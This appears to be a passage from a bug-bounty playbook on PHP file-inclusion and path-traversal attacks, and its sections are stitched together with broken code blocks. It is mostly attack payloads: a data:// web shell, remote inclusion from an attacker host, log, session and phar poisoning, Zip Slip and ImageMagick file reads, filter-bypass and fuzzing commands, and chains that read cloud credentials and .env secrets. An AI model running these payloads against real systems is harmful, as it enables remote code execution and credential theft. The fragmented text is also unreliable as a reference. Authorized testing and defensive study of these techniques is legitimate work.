- This works even when log poisoning fails (unreadable logs, `open_basedir`). Try it whenever you have a php:// filter read.

# data:// — executes inline; REQUIRES allow_url_include=On
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id   # <?php system($_GET['c']);?>

### Phase 6 — Remote File Inclusion (RFI)
RFI = the include target is a **remote URL**. Prerequisite: `allow_url_include=On` (and `allow_url_fopen=On`). Off by default on modern PHP, but still seen on legacy/misconfigured hosts.
```bash

# Host a payload you control, then:
?file=http://OOB-HOST/shell.txt          # shell.txt contains <?php system($_GET['c']); ?>
?file=https://OOB-HOST/shell.txt?
?file=ftp://OOB-HOST/shell.txt

# Step 1: inject PHP into a log the include can read
curl -s "https://$TARGET/" -H "User-Agent: <?php system(\$_GET['c']); ?>"

# Step 2: include it (verify the log is readable first — read it plain before poisoning)
?file=../../../var/log/apache2/access.log&c=id
?file=../../../var/log/nginx/access.log&c=id
?file=/proc/self/fd/0&c=id                  # stdin fd (varies)

#   /var/log/nginx/access.log /var/log/auth.log (SSH user poisoning) /proc/self/environ
```

# PHP session: set payload in a stored field (username/profile), then include the session file
?file=/var/lib/php/sessions/sess_<PHPSESSID>&c=id
?file=/tmp/sess_<PHPSESSID>&c=id

# phar:// object injection (needs an unserialize-on-metadata sink + any file upload):
?file=phar:///var/www/uploads/evil.jpg     # JPEG magic bytes prepended to a PHAR

# zip:// — archive containing the target, or a symlink to /etc/passwd
?file=zip:///var/www/uploads/a.zip%23path/inside.txt
```

### Phase 8b — Archive-extraction & image-processing sinks (no `?file=` needed)
Two LFI/traversal surfaces that are not query-parameter file reads:
- **Zip Slip / tar-symlink escape** — a server that untars/unzips a user-supplied archive follows `../../` entry names or embedded symlinks (tar preserves them) to read/write outside the extraction dir. Craft an archive entry named `../../../etc/cron.d/x`, or a symlink pointing at `/etc/passwd`; confirm by writing a unique canary outside the upload dir. Disclosed: reports/1439593, reports/733072, reports/822262.
- **ImageMagick coder read-sink** — image convert/thumbnail/avatar features read local files via MSL/MVG coders even with no file parameter: filename/label `label:@/etc/passwd`, or an MSL payload (`<image xlink:href="msl:/etc/passwd">`) plus `msl:`/`ephemeral:` pseudo-protocols (ImageTragick CVE-2016-3714 family). Disclosed: reports/1858574. Pairs with `hunt-file-upload`.

### Phase 9 — Automation (then manual-confirm everything)
```bash
ffuf -u "https://$TARGET/page.php?file=FUZZ" -w ~/wordlists/lfi.txt -mc all -fr "not found"
wfuzz -c -z file,/usr/share/wfuzz/wordlist/vulns/lfi.txt --hh <baseline-len> \
  "https://$TARGET/page.php?file=FUZZ"
dotdotpwn -m http -h $TARGET -o unix

## Named CVEs / Public Techniques (grounding)

Verified, correctly-attributed references for the patterns above:
- **PHP filter-chain to RCE** — Synacktiv research (2022); `php_filter_chain_generator`. Not a CVE; an abuse of documented `iconv` behaviour. The reason a bare file-read upgrades to Critical.
- **CVE-2021-41773** — Apache HTTP Server 2.4.49 path traversal (`%2e` in normalized path) → file read, and RCE when `mod_cgi` is enabled.
- **CVE-2021-42013** — Apache HTTP Server 2.4.50 incomplete fix for the above (double-encoded `%%32%65`) → traversal/RCE.
- **CVE-2024-4577** — PHP-CGI argument injection on Windows (Best-Fit encoding); reachable on XAMPP-style stacks, chains from file-serve to RCE.

> Grounding note: this skill is built from 31 disclosed LFI/path-traversal reports. When citing a specific HackerOne report in your write-up, link the exact report URL/ID you used — do **not** paraphrase a report ID from memory. A wrong ID is worse than none.

---

# App / cloud secrets
/proc/self/environ  ~/.aws/credentials  ~/.docker/config.json  /run/secrets/*

## Bypass Table

| Filter | Bypass |
|--------|--------|
| Strips `../` once | `....//` or `..../\` (re-forms `../` after strip) |
| URL-decodes once | `%252f` (double-encode `/`), `%252e` for dots |
| Decodes once, blocks `..` | Encode dots: `%2e%2e%2f` / overlong `%c0%ae` (legacy) |
| Appends `.php` to input | `?` or `#` truncation; null byte `%00` (PHP < 5.3.4) |
| Blocks `php://` scheme | try `PHP://`, `pHp://`, or `data://` / `expect://` |
| Prepends fixed base dir | enough `../` to escape; or absolute path if no base prepend |
| Blocks `/etc/passwd` literal | path-truncation, `/etc/./passwd`, `/etc//passwd` |
| WAF on long filter-chains | move chain to POST body / minimize payload |
| Windows | `..\..\..\windows\win.ini`, `..%5c..%5c` |

---

## Chain Table

| LFI primitive | Chain to | Impact |
|---------------|----------|--------|
| `php://filter` read | **filter-chain RCE (Phase 4)** | RCE with no upload — **Critical** |
| File read | `.env` / `config.php` / `wp-config.php` | DB creds, API keys → backend takeover |
| File read | `/proc/self/environ`, `~/.aws/credentials` | env secrets, cloud keys → SSRF/IAM pivot |
| Remote URL include | RFI (`allow_url_include`) | direct RCE — **Critical** |
| File read + upload | phar:// / log / session poison | RCE — **Critical** |
| Source disclosure | full app source | hardcoded secrets, new sinks, machineKey |

---

## Validation Discipline

**Direct-read proof (not a false positive):**
- Show real *contents*, not your echoed path. `/etc/passwd` must contain a literal `root:x:0:0:root:/root:` line. Diff the response against a known-good param value — the delta must be the file body, not a WAF/error page.
- For source reads, the **base64 must decode to valid PHP**. A garbage/empty decode = no real read.
- Rule out reflection: confirm the marker text is not simply your input bounced back. Request `/etc/passwd` and `/etc/passwd_<rand>` (non-existent) — only the real file returns content.

**Blind / OOB proof:**
- No reflection? Use a php://filter-chain or RFI payload that calls back to a **unique Burp Collaborator subdomain**. Require a DNS + HTTP hit with the server's source IP before claiming the include executed. Sub-tag per sink.
- Timing/length blind: triple-confirm a stable delta (known-large file vs missing file vs second known file). One-off deltas are noise — retract.

**Partial / truncated reads:**
- Templating may HTML-escape or cut the file. Use `php://filter/convert.base64-encode` so even a truncated read decodes to recognizable bytes; report exactly what you recovered, not what you assume is there.

**RCE proof:** show command output you control — `id` / `whoami` / `hostname` reflected, or an OOB callback from inside the executed payload (`curl http://<collab>/`). "The payload was accepted" is not RCE.

**Severity:**
- Non-sensitive file read: **Medium**
- File read exposing DB creds / API keys / private keys / cloud creds: **High**
- RCE via filter-chain / RFI / log / session / phar / CVE: **Critical**
